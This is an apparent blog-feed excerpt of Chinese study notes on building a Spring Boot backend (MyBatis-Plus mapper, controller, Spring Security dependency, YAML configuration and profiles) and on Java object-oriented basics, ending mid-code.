class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>mapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>core<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">BaseMapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Kob</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">Mapper</span><span class="token punctuation">;</span><span class="token annotation punctuation">@Mapper</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token keyword">extends</span> <span class="token class-name">BaseMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Kob</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="UserController"><a href="#UserController" class="headerlink" title="UserController"></a>UserController</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>user</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">UserMapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Kob</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token class-name">UserMapper</span> userMapper<span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/user/all/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Kob</span><span class="token punctuation">></span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> userMapper<span class="token punctuation">.</span><span class="token function">selectList</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/user/&#123;userId&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Kob</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token keyword">int</span> userId<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> userMapper<span class="token punctuation">.</span><span class="token function">selectById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="用户授权操作"><a href="#用户授权操作" class="headerlink" title="用户授权操作"></a>用户授权操作</h2><ol><li><p>  spring security模块</p></li><li><p>  需要将spring security继承进来</p></li><li><p>  从maven官网找依赖，spring-boot-starter-security</p></li><li><p>```java</p>  <!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-security -->  <dependency>      <groupId>org.springframework.boot</groupId>      <artifactId>spring-boot-starter-security</artifactId>      <version>2.7.3</version>  </dependency>    <pre class="line-numbers language-none"><code class="language-none">5.   添加进pom.xml中6.   session和jwt，选择了jwt7.   spring用户名默认为user8.   spring密码会自动生成，需要在终端中寻找## session验证1.   当spring boot传数据给client的时候，同时传了一个字符串，session id2.   client在拿到session id的时候，还会在浏览器中留一个cookie,关闭之后仍然会存在3.   每一次访问的时候，浏览器都会默认从客户端取出session id,并放到cookie中传给spring boot4.   如果cookie中的session id没有过期，则可以登录5.   如果cookie中的session id过期了，或者session id不存在，则会返回一个登录页面，让其重新登录## post请求需要在参数前面加一个注解1.   post请求需要在参数前面加一个注解2.   &#96;&#96;&#96;java     @RequestParam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="QueryWrapper"><a href="#QueryWrapper" class="headerlink" title="QueryWrapper"></a>QueryWrapper</h1><ol><li><p>  用来生成sql的where条件，entity属性也用于生成sql的where条件</p></li><li><p>  声明一个QueryWrapper：</p></li><li>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">QueryWrapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> queryWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>queryWrapper<span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token string">"column_name"</span><span class="token punctuation">,</span>value_in_database<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">User</span> user <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">selectOne</span><span class="token punctuation">(</span>queryWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这个userMapper是@Autowired private UserMapper userMapper声明出来的，记住是由userMapper来控制数据库</span><span class="token comment">//此处可以对如果查找错误进行判断</span><span class="token keyword">if</span><span class="token punctuation">(</span>user <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"用户不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//报错用throw new RuntimeException();扔出一个错误</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220908210022.png"></p></li></ol><h1 id="搭建项目的框架"><a href="#搭建项目的框架" class="headerlink" title="搭建项目的框架"></a>搭建项目的框架</h1><ol><li><p>  MVC</p></li><li><p>  M：model，用JavaBean写的实体类</p></li><li><p>```<br>  public 的类<br>  private的属性<br>  必须包含一个无参构造器，构造器可以不唯一，即可以存在其它构造器和无参构造器构成重载<br>  必须对每一个成员属性都有一个getter和一个setter</p>  <pre class="line-numbers language-none"><code class="language-none">4.   V:view,即存放前端可视化代码5.   C:controller,用来控制实体类## 再细分1.   User来映射数据库2.   Mapper来操控制数据库，其实就是复制一个接口3.   Service来实现具体的业务逻辑4.   Controller来实现和前端的交互# 黑马springboot## springboot起步依赖原理分析1.   版本锁定：在父工程中定义了一些坐标和版本信息，在后面继承这个父类时，就不需要再写版本信息了，可以有效地避免冲突2.   spring boot-web中集成了spring的一些依赖，也就是说springboot是基于spring的，spring较为底层3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220917211502.png)4.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220917211615.png)## 配置文件1.   springboot是基于约定的，很多配置都有默认值，但是如果想用自己的配置替换默认配置的话，就可以使用application.properties或者application.yml（或者application.yaml，yml和yaml是相同的，就和html和htm一样）进行配置2.   配置文件都在resources目录下3.   加载顺序：properties &gt; yml &gt; yaml,如果高低优先级中同时存在，则会采用高优先级的### properties&#96;&#96;&#96;java\server.port&#x3D;8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  properties采用键值对的形式</p></li></ol><h3 id="yml"><a href="#yml" class="headerlink" title="yml"></a>yml</h3><ol><li><p>```java<br>  server:</p><pre><code>  port: 8080</code></pre>  <pre class="line-numbers language-none"><code class="language-none">2.   使用缩进代表父子层级关系3.   冒号和数值之间有空格，如果没有空格，数值将不会被识别## yaml1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918092359.png)2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918092647.png)3.   注意：**缩进表示层级关系**4.   缩进时不允许使用tab，只允许使用空格，各个系统tab对应的空格数目可能不同，导致层次混乱（idea不用担心）5.   缩进的空格数目不重要，只要相同层级的元素左对齐即可### yaml数据格式1.   对象（map）：键值对的集合，支持行内写法2.   行内写法，不同属性之间**用逗号去分隔**3.   采用一种键值对的形式4.   &#96;&#96;&#96;     person: &#123;name: zhangsan,age: 20&#125; &#x2F;&#x2F;了解即可，最好采用缩进的写法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918093431.png"></p></li><li><p>数组：</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">address<span class="token operator">:</span><span class="token operator">-</span> beijing<span class="token operator">-</span> shanghaiaddress<span class="token operator">:</span> <span class="token punctuation">[</span>beijing<span class="token punctuation">,</span>shanghai<span class="token punctuation">]</span> <span class="token comment">//也可以采用一种默认数组下标的方式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  纯量，<strong>单引号忽略转义字符，双引号识别转义字符</strong></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918093806.png"></p></li><li><p>参数引用</p>  <pre class="line-numbers language-none"><code class="language-none">name: lisiperson:name: $&#123;name&#125;&#x2F;&#x2F;这样在获取person.name时，就会输出lisi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="读取配置文件的内容"><a href="#读取配置文件的内容" class="headerlink" title="读取配置文件的内容"></a>读取配置文件的内容</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918113134.png"></p><ol><li><p>注意，以下内容都是獲取application.properties/yml/yaml中的配置文件的内容</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;name&#125;"</span><span class="token punctuation">)</span> <span class="token comment">//這樣可以獲取到一個application配置文件中的name屬性</span><span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//然後需要一個變量來承接，而且一定要承接，爲其分配内存空間，否則會報錯,承接的變量變量名可以自定</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  可以理解為@Value中的内容是用來取數據，而承接是用來起別名</p></li><li><p>```java<br>  @Value(“{address[0]}”)<br>  private String msg;  //此時，msg的值就為address[0]</p>  <pre class="line-numbers language-none"><code class="language-none">### 注入一個對象，環境對象1.   使用這種方法的目的就是不用@Value()去一個一個地注入，一次性整體注入進去&#96;&#96;&#96;java@Autowired; &#x2F;&#x2F;使用@Autowired注解自動注入private Environment env; &#x2F;&#x2F;在springboot程序啓動的時候，就會在spring boot容器中初始化好一個Environment對象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通過getProperty方法，指定鍵的名稱，就可以獲取到鍵對應的屬性值了</p>  <pre class="line-numbers language-none"><code class="language-none">String env.getProperty(&quot;name&quot;);&#x2F;&#x2F;引號中寫鍵的名稱&#x2F;屬性的名稱<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918162453.png"></li><li>  prefix参数：捕获配置文件中固定前缀的属性，然后依次赋值到这个类中</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918162639.png"></li></ol><h3 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h3><ol><li>  @Component是基础注解，表示一个JavaBean可以被注入到spring容器中</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918163510.png"></li><li>  上面这张图片，@Component表示这个person类被spring识别，是一个bean</li></ol><h2 id="profile"><a href="#profile" class="headerlink" title="profile"></a>profile</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918163719.png"></li><li>  在程序迁移时，数据库地址，端口等配置进行动态切换</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918164056.png"></li></ol><h3 id="注意配置文件的命名"><a href="#注意配置文件的命名" class="headerlink" title="注意配置文件的命名"></a>注意配置文件的命名</h3><ol><li><p>都为</p>  <pre class="line-numbers language-none"><code class="language-none">application-xxx.properties<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  模板：</p></li><li><p>  application-dev.properties 开发环境developer</p></li><li><p>  application-pro.properties 生产环境</p></li><li><p>  application-test.properties 测试环境</p></li></ol><h3 id="profile配置方式"><a href="#profile配置方式" class="headerlink" title="profile配置方式"></a>profile配置方式</h3><ol><li>  多profile文件方式</li><li>  yml多文档方式</li></ol><h3 id="profile激活方式，多profile文件方式"><a href="#profile激活方式，多profile文件方式" class="headerlink" title="profile激活方式，多profile文件方式"></a>profile激活方式，多profile文件方式</h3><ol><li><p>```<br>  spring.profiles.active=dev</p>  <pre class="line-numbers language-none"><code class="language-none">2.   上面这个spring.profiles.active属性用来激活profile,后面的dev根据具体情况而定3.   例如dev是根据后缀application-dev.properties4.   pro是根据application-pro.properties### yml多文档方式1.   使用三个杠来分隔2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918181518.png)3.   spring.profiles.active属性来设定来调用哪一个properties### profile激活方式1.   配置文件2.   虚拟机参数3.   命令行参数### 利用虚拟机参数进行激活1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918182650.png)2.   在run&#x2F;debug configruation中更改配置3.   修改VM options参数为4.   &#96;&#96;&#96;java     -Dspring profiles active&#x3D;test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  虚拟机参数会覆盖配置文件中的配置</p></li></ol><h3 id="使用命令行参数进行配置的修改"><a href="#使用命令行参数进行配置的修改" class="headerlink" title="使用命令行参数进行配置的修改"></a>使用命令行参数进行配置的修改</h3><ol><li><p>  在program arguments中添加命令行参数</p></li><li><p>  将此参数修改为</p></li><li><pre><code class="java">  --spring.profiles.active=pro  <pre class="line-numbers language-none"><code class="language-none">### 注意1.   命令行参数和虚拟机参数激活的前提是在yml文件中写为多文档模式2.   后两种优点是不用一次次地修改配置文件## 实际生产中打成jar包的操作1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918183902.png)2.   运行jar包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  java -jar 文件名  <pre class="line-numbers language-none"><code class="language-none">3.   添加命令行参数来激活profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>  java -jar 文件名 --spring.profiles.active=pro</code></pre></li></ol><h2 id="springboot内部配置加载顺序"><a href="#springboot内部配置加载顺序" class="headerlink" title="springboot内部配置加载顺序"></a>springboot内部配置加载顺序</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918184909.png"></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> Javaweb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaweb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象OOP</title>
      <link href="/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="Java面向对象-OOP"><a href="#Java面向对象-OOP" class="headerlink" title="Java面向对象 OOP"></a>Java面向对象 OOP</h1><h2 id="Object-Oriented-Programming"><a href="#Object-Oriented-Programming" class="headerlink" title="Object Oriented Programming"></a>Object Oriented Programming</h2><h2 id="要解决的问题"><a href="#要解决的问题" class="headerlink" title="要解决的问题"></a>要解决的问题</h2><ol><li><p>  单独的变量解决，不利于数据的管理，把<strong>某个对象的信息拆解了</strong>，例如：存储一只猫的名字，年龄var等信息</p></li><li><p>如果用数组，<strong>数据类型</strong>体现不出来，而且<strong>变量名和内容的对应关系</strong>体现不出来，例如：int只能用string来存，<strong>只能通过下标来获取信息</strong></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220813150749.png"></p></li><li><p>  不能体现猫的行为，比如，数组的结构无法加入方法（函数）的处理方式</p></li><li><p>  总之，不利于数据的管理，效率低</p></li></ol><h2 id="类与对象的概述"><a href="#类与对象的概述" class="headerlink" title="类与对象的概述"></a>类与对象的概述</h2><ol><li><p>  一个程序就是一个世界，有很多事物：对象[属性，行为]</p></li><li><p>  数据类型分为Java提供的数据类型和<strong>自定义的数据类型</strong></p></li><li><p>  <strong>类就是一个数据类型</strong></p></li><li><p>  对象：可以通过一个类来创建一个对象</p></li><li><p>  实例化：就是具体化，具体到一只猫</p></li><li><p>  <strong>类是抽象的，概念的，代表一类事务：人类，猫类</strong></p></li><li><p>  <strong>对象是具体的，实际的，代表一个具体事物，即，是实例</strong></p></li><li><p><strong>类是对象的模板，对象是类的一个个体，对应一个实例</strong></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220813163126.png"></p></li></ol><h2 id="从类到对象的不同说法"><a href="#从类到对象的不同说法" class="headerlink" title="从类到对象的不同说法"></a>从类到对象的不同说法</h2><ol><li><p>  创建一个对象</p></li><li><p>  实例化一个对象</p></li><li><p>  把类实例化</p></li><li><p>总之：类实例化 -&gt; 对象</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220813163552.png"></p></li></ol><h2 id="面向对象快速入门"><a href="#面向对象快速入门" class="headerlink" title="面向对象快速入门"></a>面向对象快速入门</h2><ol><li>  使用OOP面向对象解决</li><li>  实例化一只猫[创建一只猫对象]</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 如何实例化一个对象</span>        <span class="token comment">// 1. new Catt(); 创建一只猫</span>        <span class="token comment">// 2. Catt cat1 = new Catt(); 把创建的猫赋给cat1</span>        <span class="token class-name">Catt</span> cat1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Catt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cat1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span>        cat1<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        cat1<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">"white"</span><span class="token punctuation">;</span>        <span class="token comment">// 如何访问对象的属性</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一只猫的信息"</span> <span class="token operator">+</span> cat1<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> cat1<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> cat1<span class="token punctuation">.</span>color<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Catt</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token class-name">String</span> color<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对象的内存布局，对象的存在形式"><a href="#对象的内存布局，对象的存在形式" class="headerlink" title="对象的内存布局，对象的存在形式"></a>对象的内存布局，对象的存在形式</h2><ol><li>  new后产生的<strong>对象</strong>在<strong>栈</strong>内（对象和数组都是引用类型），有一个<strong>指向堆中的地址</strong></li><li>  如果<strong>实例化的类中又有字符串</strong>等引用类型的变量，会有一个从<strong>堆中指向方法区</strong>的地址</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220813171456.png"></li></ol><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><h3 id="属性的概念"><a href="#属性的概念" class="headerlink" title="属性的概念"></a>属性的概念</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Catt</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">// name,age,color即为成员变量</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token class-name">String</span> color<span class="token punctuation">;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> master<span class="token punctuation">;</span> <span class="token comment">//属性可以是基本数据类型，也可以是引用数据类型（对象，数组）</span><span class="token punctuation">&#125;</span><span class="token class-name">Catt</span> cat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Catt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  类中的变量即为属性，成员变量是用来表示属性的</p></li><li><p>  成员变量 = 属性 = field</p></li><li><p>  属性是类的一个组成部分，一般是基本数据类型，也可以是引用类型（对象，数组）。</p></li><li><p>  Catt类实例化后产生的cat实际上是对象引用，而不是真正的对象</p></li><li><p>真正的对象是class内部的属性：name,age,color,master</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220813173531.png"></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220813173618.png"></p></li><li><p>  <strong>对象引用</strong>：实际上就是<strong>人的名字</strong>，小明，<strong>不是真正的属性</strong>，因为<strong>小明是个字符串名字，而不是一个人</strong>，引用相当于<strong>起了一个别名</strong></p></li><li><p>  对象：<strong>对象才是真正的人</strong>，<strong>对象的胳膊腿就是属性</strong></p></li></ol><h3 id="属性的定义"><a href="#属性的定义" class="headerlink" title="属性的定义"></a>属性的定义</h3><p>  1.属性的定义语法同变量：访问修饰符 + 属性范围 + 属性名；</p><ol start="2"><li>  访问修饰符：public protected 默认 private -&gt;访问范围逐渐缩小</li></ol><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><h3 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h3><ol><li><p>先声明再创建</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Cat</span> cat<span class="token punctuation">;</span> <span class="token comment">//先声明，声明的时候没有分配内存空间</span>cat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//再创建，分配内存空间，实例化</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>直接创建</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Cat</span> cat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 类的类型就是实例化的类的类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  声明格式：定义变量的类 + 定义变量的名字</p></li></ol><h3 id="访问对象中的属性"><a href="#访问对象中的属性" class="headerlink" title="访问对象中的属性"></a>访问对象中的属性</h3><ol><li><p>  基本语法：对象名.属性名</p></li><li><p>用 . 来取对象中的属性</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"小明"</span><span class="token punctuation">;</span><span class="token class-name">Person</span> b<span class="token punctuation">;</span>b <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">// </span>b<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>b<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">//将b在栈中的指向地址置为空，也就是说，原来a和b都指向堆中的同一个地址的指针，b断掉了</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这个时候输出a.age是经过b.age修改之后的200</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token 